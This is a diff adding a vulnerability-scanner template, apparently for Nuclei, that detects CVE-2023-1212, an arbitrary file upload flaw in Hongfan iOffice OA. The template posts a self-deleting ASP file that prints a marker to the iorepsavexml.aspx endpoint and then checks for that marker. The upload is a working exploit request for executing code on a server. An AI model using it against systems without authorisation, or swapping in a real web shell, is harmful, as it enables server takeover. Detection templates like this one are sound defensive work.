@@ -1,0 +1,43 @@
+id: CVE-2023-1212
+info:
+  name: iOffice OA iorepsavexml.aspx Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Hongfan OA contains an arbitrary file upload vulnerability in the iorepsavexml.aspx endpoint, allowing attackers to upload malicious files and potentially gain server access.
+  classification:
+    cvss-metrics: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.8
+  tags: file-upload
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=xxxa.asp&filepath=/upfiles/rep/pic/"
+    headers:
+      Cookie: ASP.NET_SessionId=1zt2vw55hafeo255s5s4u3ah; ASPSESSIONIDCSRCSSTR=CBFJFOEDDEPCLINOGJDHELHD
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      <%\r\n Response.Write chr(101)&chr(49)&chr(54)&chr(53)&chr(52)&chr(50)&chr(49)&chr(49)&chr(49)&chr(48)&chr(98)&chr(97)&chr(48)&chr(51)&chr(48)&chr(57)&chr(57)&chr(97)&chr(49)&chr(99)&chr(48)&chr(51)&chr(57)&chr(51)&chr(51)&chr(55)&chr(51)&chr(99)&chr(53)&chr(98)&chr(52)&chr(51)\r\nCreateObject("Scripting.FileSystemObject").DeleteFile(server.mappath(Request.ServerVariables("SCRIPT_NAME")))\r\n %>
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/iOffice/upfiles/rep/pic/xxxa.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        part: body
